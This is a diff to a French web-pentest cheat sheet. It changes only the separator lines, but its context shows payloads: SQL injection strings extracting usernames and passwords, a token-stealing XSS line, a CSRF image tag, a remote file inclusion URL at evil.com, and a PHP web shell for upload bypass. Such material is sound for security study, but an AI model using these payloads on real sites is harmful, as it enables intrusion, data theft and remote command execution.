@@ -11,7 +11,7 @@
 
 [CyberChef](https://gchq.github.io/CyberChef/)
 
-
+-----
 
 ## Index
 
@@ -25,7 +25,7 @@
 - [JSON WEB TOKEN](#JWT)
 - [Template Injection](#Template-Injection)
 
-
+-----
 
 ## SQL Injection
 
@@ -73,7 +73,7 @@ qzdqzdq' union select username,password,NULL from users--
 '||pg_sleep(10)--
 ```
 
-
+-----
 
 ## XSS
 
@@ -122,7 +122,7 @@ localStorage.getItem('access_token')
 - On peut également faire du CSRF pour obliger l'utilisateur à réaliser une action déterminée
 [CSRF](#csrf)
 
-
+-----
 
 ## XXE
 
@@ -141,7 +141,7 @@ localStorage.getItem('access_token')
 &xxe;
 ```
 
-
+-----
 
 ## CSRF
 
@@ -166,7 +166,7 @@ localStorage.getItem('access_token')
 <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
 ```
 
-
+-----
 
 ## File Inclusion
 
@@ -194,7 +194,7 @@ http://evil.com/shell.txt
 php://filter/convert.base64-encode/resource=index.php
 ```
 
-
+-----
 
 ## File Upload
 
@@ -231,7 +231,7 @@ Content-Type : image/jpeg
 <?php echo system($_GET['command']); ?>
 ```
 
-
+-----
 
 ## Insecure source code management
 
@@ -249,7 +249,7 @@ Content-Type : image/jpeg
 ```
 - Utiliser la méthodologie PayloadsAllTheThings ou un outil donné
 
-
+-----
 
 ## JWT
 
@@ -264,7 +264,7 @@ Content-Type : image/jpeg
 - Essayer de désactiver la signature
 - Essayer de cracker la signature
 
-
+-----
 
 ## Template Injection
 
